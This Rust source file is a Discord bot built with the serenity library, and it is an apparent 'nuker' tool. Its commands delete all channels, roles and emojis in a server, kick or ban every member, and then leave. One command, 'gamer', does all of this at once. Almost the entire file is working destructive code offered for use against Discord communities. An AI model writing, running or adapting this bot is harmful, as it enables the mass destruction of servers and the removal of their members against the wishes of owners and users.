use serenity::async_trait;
use serenity::model::ModelError;
use serenity::Error;
use serenity::client::{Client, Context, EventHandler};
use serenity::model::channel::Message;
use serenity::framework::standard::macros::hook;
use serenity::framework::standard::CommandError;
use serenity::framework::standard::{
    StandardFramework,
    CommandResult,
    macros::{
        command,
        group
    }
};

use std::io;

#[group]
#[commands(leave_please, channels_del, emoji_del, roles_del, gamer, kall, ball)]
struct General;

struct Handler;

#[async_trait]
impl EventHandler for Handler {}

#[tokio::main]
async fn main() {
    let framework = StandardFramework::new()
        .configure(|c| c.prefix("obama "))
        .group(&GENERAL_GROUP)
        .before(before_hook)
        .after(after_hook);

    println!("Please input your token.");
    let mut token = String::new();
    io::stdin()
        .read_line(&mut token)
        .expect("Failed to read line");

    let mut client = Client::new(token)
        .event_handler(Handler)
        .framework(framework)
        .await
        .expect("Error creating client");

    // start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("An error occurred while running the client: {:?}", why);
    }

}
#[hook]
async fn after_hook(_: &Context, _: &Message, cmd_name: &str, error: Result<(), CommandError>) {
    //  Print out an error if it happened
    if let Err(why) = error {
        println!("Error in {}: {:?}", cmd_name, why);
    }
}

#[hook]
async fn before_hook(_: &Context, _: &Message, cmd_name: &str) -> bool {
    println!("Running command {}", cmd_name);
    true
}
#[command]
async fn leave_please(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    guild.leave(&ctx).await?;
    println!("Done!");
    Ok(())
}

#[command]
async fn channels_del(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    let guild_channels = guild.channels;
    for channel in guild_channels {
        let chan = *channel.0.as_u64();
        match ctx.http.delete_channel(chan).await {
            Ok(chan) => {
                println!("delete channel {}", chan)
            },
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete {}; missing: {:?}", chan, missing_perms);
            },
            _ => {},
        }
    }
    println!("Done!");
    Ok(())
}

#[command]
async fn ball(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    let guild_members = &guild.members;
    for member in guild_members {
        let memb = member.1;
        let member_id = member.0;
        match guild.kick(&ctx, member_id).await {
            Ok(()) => println!("Successfully kicked {}", memb),
            Err(Error::Model(ModelError::GuildNotFound)) => {
                println!("Couldn't determine guild of member {}", memb);
            },
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to kick {}; missing: {:?}", memb, missing_perms);
            },
            _ => {},
        }
    }
    println!("Done!");
    Ok(())
}

#[command]
async fn kall(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    let guild_members = &guild.members;
    for member in guild_members {
        let memb = member.1;
        let member_id = member.0;
        match guild.ban(&ctx, member_id,0).await {
            Ok(()) => println!("Successfully banned {}", memb),
            Err(Error::Model(ModelError::GuildNotFound)) => {
                println!("Couldn't determine guild of member {}", memb);
            },
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to ban {}; missing: {:?}", memb, missing_perms);
            },
            _ => {},
        }
    }
    println!("Done!");
    Ok(())
}

#[command]
async fn emoji_del(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    let guild_emoji = &guild.emojis;
    for emoji in guild_emoji {
        let em = emoji.0;
        match guild.delete_emoji(&ctx, em).await {
            Ok(()) => println!("Successfully deleted {} emoji", emoji.1),
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete emoji {}; missing: {:?}", emoji.1, missing_perms);
            },
            _ => {},
        }
    }
    println!("Done!");
    Ok(())
}

#[command]
async fn roles_del(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };
    let guild_roles = &guild.roles;
    for role in guild_roles {
        let rol = role.0;
        match guild.delete_role(&ctx, rol).await {
            Ok(()) => println!("Successfully deleted {} role", role.1),
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete role {}; missing: {:?}", role.1, missing_perms);
            },
            _ => {},
        }
    }
    println!("Done!");
    Ok(())
} 

#[command]
async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
    let guild = match msg.guild(ctx).await {
        Some(guild) => guild,
        None => {
            msg.channel_id.say(ctx, "DMs not supported").await?;
    
            return Ok(());
        }
    };

    let guild_channels = &guild.channels;
    let guild_members = &guild.members;
    let guild_roles = &guild.roles;
    let guild_emoji = &guild.emojis;

    for channel in guild_channels {
        let chan = *channel.0.as_u64();
        match ctx.http.delete_channel(chan).await {
            Ok(chan) => {
                println!("delete channel {}", chan)
            },
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete {}; missing: {:?}", chan, missing_perms);
            },
            _ => {},
        }
    }
    for member in guild_members {
        let memb = member.1;
        let member_id = member.0;
        match guild.ban(&ctx, member_id,0).await {
            Ok(()) => println!("Successfully banned {}", memb),
            Err(Error::Model(ModelError::GuildNotFound)) => {
                println!("Couldn't determine guild of member {}", memb);
            },
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to ban {}; missing: {:?}", memb, missing_perms);
            },
            _ => {},
        }
    }
    for role in guild_roles {
        let rol = role.0;
        match guild.delete_role(&ctx, rol).await {
            Ok(()) => println!("Successfully deleted {} role", role.1),
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete role {}; missing: {:?}", role.1, missing_perms);
            },
            _ => {},
        }
    }
    for emoji in guild_emoji {
        let em = emoji.0;
        match guild.delete_emoji(&ctx, em).await {
            Ok(()) => println!("Successfully deleted {} emoji", emoji.1),
            Err(Error::Model(ModelError::InvalidPermissions(missing_perms))) => {
                println!("Didn't have permissions to delete emoji {}; missing: {:?}", emoji.1, missing_perms);
            },
            _ => {},
        }
    }
    guild.leave(&ctx).await?;
    println!("Done!");
    Ok(())
}